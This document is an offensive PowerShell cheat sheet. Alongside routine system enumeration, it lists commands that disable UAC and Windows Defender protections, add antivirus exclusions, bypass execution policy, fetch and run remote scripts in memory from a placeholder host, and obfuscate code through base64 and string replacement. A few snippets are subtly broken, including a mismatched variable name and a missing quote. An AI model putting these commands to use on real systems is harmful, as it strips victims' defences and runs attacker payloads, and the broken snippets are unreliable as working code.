# Offensive PowerShell

\# Cmdlet Help  
`Get-Help <CMDLET>`  
\# List all running processes  
`Get-Process`  
\# Execution Policy Information  
`Get-ExecutionPolicy -List`  
\# Allow unsigned scripts execution for the current user  
`Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser`  
`powershell -ep bypass`  
\# Get UAC Configuration  
`Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" | Select-Object -Property EnableLUA,ConsentPromptBehaviorAdmin`  
(EnableLUA = UAC [0 = False, 1 = True], ConsentPromptBehaviorAdmin = Prompt Behavior [0-5])  
\# Disable UAC (requires admin)  
`cmd.exe /c "C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"`  
\# Get Current Computer Information  
`Get-ComputerInfo -Property CsName,WindowsVersion,WindowsBuildLabEx,WindowsEditionId,OsArchitecture,CsProcessors,CsTotalPhysicalMemory`  
\# Get Network Interfaces Information  
`Get-NetAdapter`  
`Get-NetIPAddress`  
`Get-NetIPConfiguration`  
\# Get Local Users Information  
`Get-LocalUser | Select-Object Name,SID,Enabled,LastLogon,Created,Modified`  
\# Get Local Groups Information  
`Get-LocalGroup`  
`Get-LocalGroupMember -Group <GROUP NAME>`  
\# Get Firewall Information  
` Get-NetFirewallProfile`  
\# Get Windows Defender Status  
`Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,IsTamperProtected`  
`Get-MpPreference` (some items require admin access to display information)  
\# List other AV Products  
`Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct`  
`'0x{0:x}' -f <ProductState>`  (10 from the 4th number position = on)  
\# Disables realtime monitoring (requires admin)    
`Set-MpPreference -DisableRealtimeMonitoring $true`  
\# Disables scanning for downloaded files or attachments (requires admin)    
`Set-MpPreference -DisableIOAVProtection $true`  
\# Disable behaviour monitoring (requires admin)    
`Set-MPPreference -DisableBehaviourMonitoring $true`  
\# Make exclusion for a certain folder (requires admin)    
`Add-MpPreference -ExclusionPath "C:\Windows\Temp"`  
\# Disables cloud detection (requires admin)    
`Set-MPPreference -DisableBlockAtFirstSeen $true`  
\# Disables scanning of .pst and other email formats (requires admin)    
`Set-MPPreference -DisableEmailScanning $true`  
\# Disables script scanning during malware scans (requires admin)    
`Set-MPPReference -DisableScriptScanning $true`  
\# Exclude files by extension (requires admin)  
`Set-MpPreference -ExclusionExtension "ps1"`  
\# Code Injection - Invoke-Expression  
`$<STRING> = 'Write-Output "Test text!"'`  
`Invoke-Expression $<STRING>`  
\# Remote Code Execution - Invoke-Command  
`$computer = "<COMPUTER>"`  
`$creds = Get-Credential`  
`$script = { Write-Output "Test text!" }`  
`Invoke-Command -ComputerName $computer -Credential $creds -ScriptBlock $script`  
#\ Remote Code Execution - Invoke-RestMethod (Download and run remote scripts)  
`$url = "https://site.com/script.ps1"`  
`$script = Invoke-RestMethod -Uri $url`  
`Invoke-Expression $script`  
\# Remote Code Execution - Start-Process (open a new PS instance and run a downloaded script - useful to bypass execution policies)  
`$url = "https://site.com/script.ps1"`  
`Invoke-WebRequest -Uri $url -OutFile "script.ps1"`  
`Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File script.ps1"`  
\# Remote Code Execution - IEX = Invoke-Expression (run script from memory)  
`$url = "https://site.com/script.ps1"`  
`IEX (New-Object System.Net.WebClient).DownloadString($url)`  
\# Remote Code Execution - Invoke-WebRequest (run script from memory)  
`$url = "https://site.com/script.ps1`  
`$script = Invoke-WebRequest -Uri $url -UseBasicParsing`  
`Invoke-Expression $script.Content`  
\# Remote Code Execution - Invoke-RestMethod (run script from memory)  
`$url = "https://site.com/script.ps1"`  
`$script = Invoke-RestMethod -Uri $url`  
`Invoke-Expression $script`  
\# Remote Code Execution - BitsTransfer (run script from memory)  
`$url = "https://site.com/script.ps1"`  
`Import-Module BitsTransfer`  
`Start-BitsTransfer -Source $url -Destination "script.ps1"`  
`Invoke-Expression -Command (Get-Content -Path "script.ps1" -Raw)`  
\# Remote Code Execution - Code Compression / Decompression (run script from memory)  
`$url = "https://site.com/script.ps1.gz"`  
`$compressed = (New-Object System.Net.WebClient).DownloadData($url)`  
`$stream = New-Object IO.MemoryStream`  
`$stream.Write($compressed, 0, $compressed.Length)`  
`$stream.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null`  
`$gzip = New-Object IO.Compression.GzipStream($stream,[IO.Compression.CompressionMode]::Decompress)`  
`$reader = New-Object IO.StreamReader($gzip)`  
`$script = $reader.ReadToEnd()`  
`Invoke-Expression $script`  
\# Code Obfuscation - base64 Encoding  
`$text = "Test encoded text"`  
`$bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)`  
`$encoded =[Convert]::ToBase64String($bytes)`  
`Invoke-Expression $encoded`  
\# Code Obfuscation - base64 Decoding  
`$encoded = "VABlAHMAdAAgAGUAbgBjAG8AZABlAGQAIAB0AGUAeAB0AA=="`  
`$decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))`  
`Invoke-Expression $decoded`  
\# Code Obfuscation - Characters Replacement  
`$obfuscated = "abcdef-ghijkl 'Test text'"`  
`$command = $obfuscatedCommand -replace 'abcdef', 'Write' -replace 'ghijkl', 'Output'`  
`Invoke-Expression $command`  
